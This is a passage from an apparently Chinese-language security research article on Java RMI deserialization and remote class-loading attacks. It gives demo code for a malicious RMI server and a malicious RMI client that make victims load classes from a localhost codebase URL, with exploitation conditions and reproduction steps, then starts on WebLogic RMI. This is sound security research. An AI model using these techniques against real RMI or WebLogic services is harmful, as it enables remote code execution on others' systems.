        }
    }
恶意的RMI服务端：
    package com.longofo.javarmi;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.UnicastRemoteObject;
    public class RMIServer1 {
        public static void main(String[] args) {
            try {
                // 实例化服务端远程对象
                ServicesImpl1 obj = new ServicesImpl1();
                // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
                Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
                //设置java.rmi.server.codebase
                System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
                Registry reg;
                try {
                    // 创建Registry
                    reg = LocateRegistry.createRegistry(9999);
                    System.out.println("java RMI registry created. port on 9999...");
                } catch (Exception e) {
                    System.out.println("Using existing registry");
                    reg = LocateRegistry.getRegistry();
                }
                //绑定远程对象到Registry
                reg.bind("Services", services);
            } catch (RemoteException e) {
                e.printStackTrace();
            } catch (AlreadyBoundException e) {
                e.printStackTrace();
            }
        }
    }
RMI客户端：
    //RMIClient1.java
    package com.longofo.javarmi;
    import java.rmi.RMISecurityManager;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class RMIClient1 {
        /**
         * Java RMI恶意利用demo
         *
         * @param args
         * @throws Exception
         */
        public static void main(String[] args) throws Exception {
            //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
            System.setProperty("java.security.policy", RMIClient1.class.getClassLoader().getResource("java.policy").getFile());
            RMISecurityManager securityManager = new RMISecurityManager();
            System.setSecurityManager(securityManager);
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9999);
            // 获取远程对象的引用
            Services services = (Services) registry.lookup("Services");
            Message message = new Message();
            message.setMessage("hahaha");
            services.sendMessage(message);
        }
    }
这样就模拟出了一种攻击场景，这时受害者是作为RMI客户端的，需要满足以下条件才能利用：
  1. 可以控制客户端去连接我们的恶意服务端
  2. 客户端允许远程加载类
  3. 还有上面的说的JDK版本限制
可以看到利用条件很苛刻，如果真的满足了以上条件，那么就可以模拟一个恶意的RMI服务端进行攻击。完整代码在[github](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)上，先启动`remote-class/src/main/java/com/longofo/remoteclass/HttpServer`，接着启动`java-rmi-server/src/main/java/com/longofo/javarmi/RMIServer1.java`，再启动`java-rmi-client/src/main/java/com/longofo/javarmi/RMIClient1.java`即可复现，在JDK
1.6.0_29测试通过。
##### 远程方法参数对象为远程接口方法参数对象的子类（目标Server端需要为RMI Server端才能利用）
刚开始讲Java RMI的时候，我们模拟了一种攻击，那种情况和这种情况是类似的，上面那种情况是利用加载本地类，而这里的是加载远程类。
RMI服务端：
    //RMIServer.java
    package com.longofo.javarmi;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RMISecurityManager;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.UnicastRemoteObject;
    public class RMIServer2 {
        /**
         * Java RMI 服务端
         *
         * @param args
         */
        public static void main(String[] args) {
            try {
                // 实例化服务端远程对象
                ServicesImpl obj = new ServicesImpl();
                // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
                Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
                Registry reg;
                try {
                    //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
                    System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
                    RMISecurityManager securityManager = new RMISecurityManager();
                    System.setSecurityManager(securityManager);
                    // 创建Registry
                    reg = LocateRegistry.createRegistry(9999);
                    System.out.println("java RMI registry created. port on 9999...");
                } catch (Exception e) {
                    System.out.println("Using existing registry");
                    reg = LocateRegistry.getRegistry();
                }
                //绑定远程对象到Registry
                reg.bind("Services", services);
            } catch (RemoteException e) {
                e.printStackTrace();
            } catch (AlreadyBoundException e) {
                e.printStackTrace();
            }
        }
    }
远程对象接口：
    package com.longofo.javarmi;
    import java.rmi.RemoteException;
    public interface Services extends java.rmi.Remote {
        Object sendMessage(Message msg) throws RemoteException;
    }
恶意远程方法参数对象子类：
    package com.longofo.remoteclass;
    import com.longofo.javarmi.Message;
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    import java.io.Serializable;
    import java.util.Hashtable;
    public class ExportObject1 extends Message implements ObjectFactory, Serializable {
        private static final long serialVersionUID = 4474289574195395731L;
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
            return null;
        }
    }
恶意RMI客户端：
    package com.longofo.javarmi;
    import com.longofo.remoteclass.ExportObject1;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class RMIClient2 {
        public static void main(String[] args) throws Exception {
            System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
            Registry registry = LocateRegistry.getRegistry();
            // 获取远程对象的引用
            Services services = (Services) registry.lookup("rmi://127.0.0.1:9999/Services");
            ExportObject1 exportObject1 = new ExportObject1();
            exportObject1.setMessage("hahaha");
            services.sendMessage(exportObject1);
        }
    }
这样就模拟出了另一种攻击场景，这时受害者是作为RMI服务端，需要满足以下条件才能利用：
  1. RMI服务端允许远程加载类
  2. 还有JDK限制
利用条件也很苛刻，如果真的满足了以上条件，那么就可以模拟一个恶意的RMI客户端进行攻击。完整代码在[github](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)上，先启动`remote-class/src/main/java/com/longofo/remoteclass/HttpServer`，接着启动`java-rmi-server/src/main/java/com/longofo/javarmi/RMIServer2.java`，再启动`java-rmi-client/src/main/java/com/longofo/javarmi/RMIClient2.java`即可复现，在JDK
1.6.0_29测试通过。
#### Weblogic RMI
##### Weblogic RMI与Java RMI的区别
为什么要把Weblogic RMI写这里呢？因为通过Weblogic RMI作为反序列化入口导致的漏洞很多，常常听见的通过Weblogic
T3协议进行反序列化...一开始也没去了详细了解过Weblogic RMI和Weblogic T3协议有什么关系，也是直接拿着python
weblogic那个T3脚本直接打。然后搜索的资料大多也都是讲的上面的Java RMI，用的JRMP协议传输，没有区分过Java RMI和Weblogic
RMI有什么区别，T3和JRMP又是是什么，很容易让人迷惑。
从[这篇文中](https://www.oreilly.com/library/view/weblogic-the-definitive/059600432X/ch04s03.html)[5]我们可以了解到，WebLogic
RMI是服务器框架的组成部分。它使Java客户端可以透明地访问WebLogic
Server上的RMI对象，这包括访问任何已部署到WebLogic的EJB组件和其他J2EE资源，它可以构建快速、可靠、符合标准的RMI应用程序。当RMI对象部署到WebLogic群集时，它还集成了对负载平衡和故障转移的支持。WebLogic
RMI与Java RMI规范完全兼容，上面提到的动态加载加载功能也是具有的，同时还提供了在标准Java
RMI实现下更多的功能与扩展。下面简要概述了使用WebLogic版本的RMI的一些其他好处：
1.性能和可扩展性
WebLogic包含了高度优化的RMI实现。它处理与RMI支持有关的所有实现问题：管理线程和套接字、垃圾回收和序列化。标准RMI依赖于客户端与服务器之间以及客户端与RMI注册表之间的单独套接字连接。WebLogic